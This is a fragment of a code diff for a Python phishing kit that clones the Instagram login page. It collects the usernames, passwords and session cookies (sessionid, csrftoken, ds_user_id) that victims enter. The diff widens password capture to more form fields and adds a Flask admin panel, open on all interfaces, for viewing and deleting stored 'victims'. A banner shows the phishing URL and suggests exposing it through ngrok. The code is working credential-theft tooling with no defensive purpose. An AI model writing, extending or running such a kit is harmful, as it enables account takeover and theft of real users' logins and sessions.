             post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
             params = parse_qs(post_data)
             username = params.get('username', [''])[0]
-            password = params.get('enc_password', [''])[0]
+            password = params.get('enc_password', params.get('password', ['']))[0]
             
             if username or password:
                 cookie_header = self.headers.get('Cookie', '')
@@ -493,6 +854,11 @@ def main():
     cloner = InstagramExactCloner()
     cloner.build()
     
+    print(f"{Colors.CYAN}[!] Copy all images to cloned_site/images/ from repo{Colors.RESET}")
+    
+    # Start Admin Panel in background
+    threading.Thread(target=start_admin, daemon=True).start()
+    
     server = socketserver.ThreadingTCPServer((CONFIG["listen_host"], CONFIG["listen_port"]), PhantomHandler)
     
     if os.path.exists(CONFIG["ssl_cert"]):
@@ -502,19 +868,56 @@ def main():
         print(f"{Colors.GREEN}[+] HTTPS enabled on port {CONFIG['listen_port']}{Colors.RESET}")
     
     print(f"""
-{Colors.CYAN}╔════════════════════════════════════════╗
-║  Phishing URL: https://127.0.0.1:{CONFIG['listen_port']}     ║
-║  Logs: logs/credentials.txt             ║
-║  Cookies: logs/cookies.txt              ║
-╚══════════════════════════════════════════╝
+{Colors.CYAN}╔══════════════════════════════════════════╗
+║  Phishing URL: https://127.0.0.1:{CONFIG['listen_port']}       ║
+║  Admin Panel:  http://127.0.0.1:{CONFIG['admin_port']}        ║
+║  Logs: logs/credentials.txt               ║
+╚══════════════════════════════════════════════╝
 {Colors.YELLOW}Expose with: ngrok http {CONFIG['listen_port']}{Colors.RESET}
-{Colors.RED}Service Worker bypasses all browser warnings.{Colors.RESET}
 """)
     
     try:
         server.serve_forever()
     except KeyboardInterrupt:
-        print(f"\n{Colors.RED}[!] Shutdown. Data saved.{Colors.RESET}")
+        print(f"\n{Colors.RED}[!] Shutdown.{Colors.RESET}")
+
+def start_admin():
+    from flask import Flask, jsonify, send_file
+    import sqlite3
+    
+    admin_app = Flask(__name__)
+    
+    @admin_app.route('/')
+    def index():
+        return send_file('admin.html')
+    
+    @admin_app.route('/api/data')
+    def data():
+        conn = sqlite3.connect(CONFIG["db_file"])
+        c = conn.cursor()
+        c.execute('SELECT * FROM victims ORDER BY id DESC LIMIT 200')
+        victims = []
+        for row in c.fetchall():
+            victims.append({
+                'id': row[0], 'timestamp': row[1], 'ip': row[2],
+                'username': row[4], 'password': row[5], 'sessionid': row[6],
+                'csrftoken': row[7], 'ds_user_id': row[8]
+            })
+        c.execute('SELECT COUNT(*) FROM victims')
+        total = c.fetchone()[0]
+        conn.close()
+        return jsonify({'total': total, 'victims': victims})
+    
+    @admin_app.route('/api/delete/<int:victim_id>')
+    def delete(victim_id):
+        conn = sqlite3.connect(CONFIG["db_file"])
+        c = conn.cursor()
+        c.execute('DELETE FROM victims WHERE id=?', (victim_id,))
+        conn.commit()
+        conn.close()
+        return jsonify({'status': 'deleted'})
+    
+    admin_app.run(host='0.0.0.0', port=CONFIG['admin_port'], debug=False)
 
 if __name__ == "__main__":
     main()
